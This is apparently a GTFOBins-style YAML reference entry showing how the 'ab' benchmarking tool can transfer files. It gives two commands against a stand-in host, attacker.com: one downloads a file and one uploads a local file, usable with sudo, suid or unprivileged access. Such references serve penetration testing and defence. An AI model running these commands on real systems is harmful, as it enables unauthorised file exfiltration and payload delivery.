---
functions:
  download:
  - code: |-
      ab -v2 http://attacker.com/path/to/input-file
    contexts:
      sudo:
      suid:
      unprivileged:
    sender: http-server
  upload:
  - code: |-
      ab -p /path/to/input-file http://attacker.com/
    contexts:
      sudo:
      suid:
      unprivileged:
    receiver: http-server
...
